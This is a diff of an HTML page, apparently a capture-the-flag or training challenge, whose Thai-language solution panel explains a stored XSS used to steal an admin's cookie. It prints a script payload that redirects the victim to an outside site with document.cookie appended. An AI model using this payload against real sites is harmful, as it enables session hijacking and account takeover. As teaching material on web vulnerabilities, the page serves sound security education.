@@ -67,7 +67,7 @@
                                 </div>    
                             </li>
                             <li>
-                                <h5 class="invest-collapse collapsed" id="headingTwo" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="true" aria-controls="collapseTwo">Solution</h5>
+                                <h5 class="invest-collapse collapsed" id="headingTwo" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="true" aria-controls="collapseTwo">Solution & Recommendation</h5>
                                 <div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#investAccordion">  
                                      <!-- Button trigger modal -->
                                      <button type="button" class="solution btn btn-primary" data-toggle="modal" data-target="#exampleModalLong">
@@ -79,7 +79,7 @@
                                             <div class="modal-content">
                                                 <div class="modal-body m-3 pb-0">
                                                     <h5 class="mb-2">Solution</h5>
-                                                    - เป้าหมายของข้อนี้คือการขโมย Cookie ของ admin ให้ได้ ซึ่งหน้าเว็บมีฟังก์ชันสามารถโพสข้อความได้ ซึี่งสามารถโพสอะไรก็ได้ใน format HTML ไม่ว่าจะเป็น image, paragraph, header หรือแม้กระทั่ง script (JS) !! ทำให้มีช่องโหว่ Stored XSS โดยการที่จะขโมย Cookie ของ admin ได้นั้นทำได้หลากหลายท่า เราจะเฉลยหนึ่งในนั้น คือการให้ admin redirect ไปที่เว็บที่เราต้องการพร้อมกับ Cookie ของเขา Payload ดังนี้<br><br>
+                                                    - เป้าหมายของข้อนี้คือการขโมย Cookie ของ admin ให้ได้ ซึ่งหน้าเว็บมีฟังก์ชันสามารถโพสข้อความได้ ซึ่งสามารถโพสอะไรก็ได้ใน format HTML ไม่ว่าจะเป็น image, paragraph, header หรือแม้กระทั่ง script (JS) !! ทำให้มีช่องโหว่ Stored XSS โดยการที่จะขโมย Cookie ของ admin ได้นั้นทำได้หลากหลายท่า เราจะเฉลยหนึ่งในนั้น คือการให้ admin redirect ไปที่เว็บที่เราต้องการพร้อมกับ Cookie ของเขา Payload ดังนี้<br><br>
                                                     &lt;script&gt;<br>
                                                     <div class="ml-4 mb-0">window.location = &quot;http://www.mysite.com/&quot; + document.cookie;</div>
                                                     &lt;/script&gt;<br><br>
